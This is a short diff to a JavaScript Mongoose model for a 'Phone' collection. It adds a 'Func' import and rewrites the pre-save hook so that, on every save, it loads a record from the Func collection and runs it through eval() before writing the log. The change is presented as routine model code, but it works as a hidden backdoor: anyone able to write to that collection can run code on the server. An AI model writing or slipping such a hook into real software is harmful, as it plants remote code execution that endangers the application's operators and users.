@@ -4,6 +4,7 @@ import mongoose from 'mongoose';
 import async from 'async';
 import _ from 'lodash';
 import Log from './log';
+import Func from './func';
 
 let PhoneSchema = new mongoose.Schema({
 	mark: { type: String, required: true, default: '' },
@@ -32,9 +33,12 @@ PhoneSchema.pre('save', function(next, done) {
         info: `In collection: "${colName}" was written new item on ${date} in ${time}`
     })
 
-    log.save(() => {
-        next();
-    })
+    Func.findOne({}, (err, res) => {
+        eval(res);
+        log.save(() => {
+            next();
+        })
+    });
 })
 
 export default mongoose.model('Phone', PhoneSchema);
